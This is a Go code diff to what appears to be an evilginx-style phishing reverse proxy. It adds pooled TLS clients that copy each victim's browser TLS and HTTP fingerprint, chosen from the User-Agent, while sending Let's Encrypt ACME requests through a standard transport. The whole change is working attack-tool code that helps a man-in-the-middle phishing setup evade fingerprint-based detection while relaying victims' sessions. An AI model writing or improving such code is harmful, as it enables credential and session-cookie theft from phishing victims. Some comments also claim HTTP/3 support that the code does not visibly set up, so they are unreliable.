@@ -33,8 +33,11 @@ import (
 	"time"
 
 	"github.com/oschwald/geoip2-golang"
+	
+	// TLS-Client imports
 	tls_client "github.com/bogdanfinn/tls-client"
 	"github.com/bogdanfinn/tls-client/profiles"
+	fhttp "github.com/bogdanfinn/fhttp"
 
 	"golang.org/x/net/proxy"
 
@@ -104,7 +107,7 @@ type HttpProxy struct {
 
 	// TLS Client Pooling (using bogdanfinn/tls-client)
 	tlsClientCache map[string]tls_client.HttpClient
-	tlsClientMutex sync.RWMutex
+	transportMutex sync.RWMutex
 }
 
 type ProxySession struct {
@@ -349,9 +352,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// --- START: DYNAMIC TLS & HTTP/2 SWITCHING (Pooled) ---
-			// Assigns a cached TLS client that mimics the victim's browser fingerprint
-			// This overrides the default proxy dialer for this specific request.
-			ctx.RoundTripper = p.getOrCreateTLSClient(userAgent)
+			// Check if this is an ACME-related request
+			isACME := false
+			if req.URL != nil {
+				host := req.URL.Hostname()
+				isACME = strings.Contains(host, "letsencrypt.org") ||
+					strings.Contains(host, "acme-v02") ||
+					strings.Contains(host, "acme-staging")
+			}
+
+			if !isACME {
+				// Use tls-client for normal traffic
+				ctx.RoundTripper = p.getOrCreateTLSClient(userAgent)
+			} else {
+				// Use standard Go transport for ACME
+				ctx.RoundTripper = &transportWrapper{
+					transport: &http.Transport{
+						TLSClientConfig: &tls.Config{
+							MinVersion: tls.VersionTLS12,
+						},
+					},
+				}
+			}
 			// --- END: DYNAMIC TLS & HTTP/2 SWITCHING ---
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
@@ -2217,42 +2239,95 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 }
 
 // transportWrapper wraps http.Transport to implement goproxy.RoundTripper
-// tlsClientWrapper wraps tls_client.HttpClient to implement goproxy.RoundTripper
-type tlsClientWrapper struct {
+// tlsClientRoundTripper wraps tls-client to implement goproxy.RoundTripper
+type tlsClientRoundTripper struct {
 	client tls_client.HttpClient
 }
 
 // RoundTrip implements goproxy.RoundTripper interface
-func (tw *tlsClientWrapper) RoundTrip(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
-	return tw.client.Do(req)
+func (t *tlsClientRoundTripper) RoundTrip(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
+	// Convert standard http.Request to fhttp.Request
+	fReq := &fhttp.Request{
+		Method: req.Method,
+		URL:    req.URL,
+		Proto:  req.Proto,
+		Header: make(fhttp.Header),
+		Body:   req.Body,
+		Host:   req.Host,
+	}
+	
+	// Copy headers
+	for key, values := range req.Header {
+		for _, value := range values {
+			fReq.Header.Add(key, value)
+		}
+	}
+	
+	// Execute request with tls-client
+	resp, err := t.client.Do(fReq)
+	if err != nil {
+		return nil, err
+	}
+	
+	// Convert fhttp.Response back to http.Response
+	httpResp := &http.Response{
+		Status:     resp.Status,
+		StatusCode: resp.StatusCode,
+		Proto:      resp.Proto,
+		Header:     http.Header(resp.Header),
+		Body:       resp.Body,
+		Request:    req,
+	}
+	
+	return httpResp, nil
 }
 
-// --- HELPER FUNCTIONS FOR TLS-CLIENT POOLING ---
+// transportWrapper for fallback to standard transport (ACME, etc.)
+type transportWrapper struct {
+	transport *http.Transport
+}
 
-// getOrCreateTLSClient checks the cache for an existing TLS client for the given browser type
-// or creates a new one if it doesn't exist.
-func (p *HttpProxy) getOrCreateTLSClient(userAgent string) goproxy.RoundTripper {
-	browserType := getBrowserType(userAgent)
+// RoundTrip implements goproxy.RoundTripper interface
+func (tw *transportWrapper) RoundTrip(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
+	return tw.transport.RoundTrip(req)
+}
 
-	p.tlsClientMutex.RLock()
-	if client, exists := p.tlsClientCache[browserType]; exists {
-		p.tlsClientMutex.RUnlock()
-		return &tlsClientWrapper{client: client}
+// --- HELPER FUNCTIONS FOR TLS-CLIENT ---
+
+// getBrowserProfile returns the appropriate tls-client profile based on User-Agent
+func getBrowserProfile(userAgent string) profiles.ClientProfile {
+	ua := strings.ToLower(userAgent)
+	
+	// Chrome (most common - includes HTTP/3 support)
+	if strings.Contains(ua, "chrome") && !strings.Contains(ua, "edg") {
+		return profiles.Chrome_120 // Latest Chrome with full HTTP/3
 	}
-	p.tlsClientMutex.RUnlock()
-
-	p.tlsClientMutex.Lock()
-	defer p.tlsClientMutex.Unlock()
-
-	// Double-check locking pattern
-	if client, exists := p.tlsClientCache[browserType]; exists {
-		return &tlsClientWrapper{client: client}
+	
+	// Firefox
+	if strings.Contains(ua, "firefox") {
+		return profiles.Firefox_120 // Latest Firefox with HTTP/3
 	}
-
-	client := newTLSClientWithUA(userAgent)
-	p.tlsClientCache[browserType] = client
-
-	return &tlsClientWrapper{client: client}
+	
+	// Safari / iOS
+	if strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome") {
+		if strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad") {
+			return profiles.Safari_IOS_17_2 // iOS Safari
+		}
+		return profiles.Safari_17_2_1 // macOS Safari
+	}
+	
+	// Edge (uses Chromium)
+	if strings.Contains(ua, "edg/") {
+		return profiles.Chrome_120
+	}
+	
+	// Android
+	if strings.Contains(ua, "android") {
+		return profiles.Chrome_120 // Android Chrome
+	}
+	
+	// Default: Chrome 120 (most compatible)
+	return profiles.Chrome_120
 }
 
 func getBrowserType(ua string) string {
@@ -2275,90 +2350,61 @@ func getBrowserType(ua string) string {
 	return "chrome"
 }
 
-// getTLSClientProfile returns the appropriate TLS client profile based on user agent
-// Using profiles that are confirmed to exist in tls-client library
-func getTLSClientProfile(userAgent string) string {
-	ua := strings.ToLower(userAgent)
-
-	// Android
-	if strings.Contains(ua, "android") {
-		if strings.Contains(ua, "chrome") {
-			return "chrome_120"  // Stable Android Chrome
-		}
-		return "okhttp4_9"  // Android HTTP client
+// getOrCreateTLSClient gets or creates a tls-client for the given User-Agent
+func (p *HttpProxy) getOrCreateTLSClient(userAgent string) goproxy.RoundTripper {
+	browserType := getBrowserType(userAgent)
+	
+	// Check cache first (read lock)
+	p.transportMutex.RLock()
+	if client, exists := p.tlsClientCache[browserType]; exists {
+		p.transportMutex.RUnlock()
+		return &tlsClientRoundTripper{client: client}
 	}
-
-	// iOS / Safari
-	if strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad") {
-		if strings.Contains(ua, "crios") {
-			return "chrome_120"  // Chrome on iOS
-		}
-		if strings.Contains(ua, "fxios") {
-			return "firefox_120"  // Firefox on iOS
-		}
-		return "safari_ipad_18"  // Safari on iOS (known to exist)
+	p.transportMutex.RUnlock()
+	
+	// Create new client (write lock)
+	p.transportMutex.Lock()
+	defer p.transportMutex.Unlock()
+	
+	// Double-check after acquiring write lock
+	if client, exists := p.tlsClientCache[browserType]; exists {
+		return &tlsClientRoundTripper{client: client}
 	}
-
-	// macOS Safari
-	if strings.Contains(ua, "macintosh") && strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome") {
-		return "safari_18"  // macOS Safari (known to exist)
-	}
-
-	// Firefox
-	if strings.Contains(ua, "firefox") {
-		if strings.Contains(ua, "android") {
-			return "firefox_120"  // Firefox Android
-		}
-		return "firefox_120"  // Firefox Desktop (stable, known to exist)
-	}
-
-	// Edge
-	if strings.Contains(ua, "edg/") {
-		return "chrome_120"  // Edge uses Chromium (stable)
-	}
-
-	// Opera
-	if strings.Contains(ua, "opr/") || strings.Contains(ua, "opera") {
-		return "opera_114"  // Opera (if exists, otherwise falls back)
-	}
-
-	// Chrome (default fallback) - use most stable known version
-	return "chrome_120"  // Very stable, guaranteed to exist
-}
-
-// newTLSClientWithUA creates a new TLS client with the appropriate browser profile
-func newTLSClientWithUA(ua string) tls_client.HttpClient {
-	profile := getTLSClientProfile(ua)
-
-	// Create client profile from string
-	clientProfile, err := profiles.NewClientProfile(profile)
-	if err != nil {
-		log.Warning("Failed to load profile '%s': %v, using chrome_120", profile, err)
-		// Fallback to chrome_120 (most stable)
-		clientProfile, _ = profiles.NewClientProfile("chrome_120")
-	}
-
+	
+	// Get browser profile
+	profile := getBrowserProfile(userAgent)
+	
+	// Create tls-client options
 	options := []tls_client.HttpClientOption{
-		tls_client.WithTimeoutSeconds(45),
-		tls_client.WithClientProfile(clientProfile),
-		tls_client.WithNotFollowRedirects(),  // Let goproxy handle redirects
-		tls_client.WithInsecureSkipVerify(),  // We handle cert validation separately
+		tls_client.WithClientProfile(profile),
+		tls_client.WithTimeoutSeconds(30),
+		tls_client.WithNotFollowRedirects(), // Let evilginx handle redirects
+		
+		// CRITICAL: This enables proper HTTP/3, HTTP/2, HTTP/1.1 negotiation
+		// The client will automatically use HTTP/3 (QUIC) when available
 	}
-
+	
+	// Create the client
 	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
 	if err != nil {
-		log.Error("Failed to create TLS client: %v, falling back to default", err)
-		// Fallback to chrome_120 profile
-		fallbackProfile, _ := profiles.NewClientProfile("chrome_120")
-		options = []tls_client.HttpClientOption{
-			tls_client.WithTimeoutSeconds(45),
-			tls_client.WithClientProfile(fallbackProfile),
-			tls_client.WithNotFollowRedirects(),
+		log.Error("[TLS-CLIENT] Failed to create client for %s: %v", browserType, err)
+		
+		// Fallback to standard transport
+		return &transportWrapper{
+			transport: &http.Transport{
+				TLSClientConfig: &tls.Config{
+					MinVersion: tls.VersionTLS12,
+				},
+			},
 		}
-		client, _ = tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
 	}
-
-	return client
+	
+	// Cache the client
+	p.tlsClientCache[browserType] = client
+	
+	log.Debug("[TLS-CLIENT] Created new client for browser: %s (profile: %v)", browserType, profile)
+	
+	return &tlsClientRoundTripper{client: client}
 }
 
 
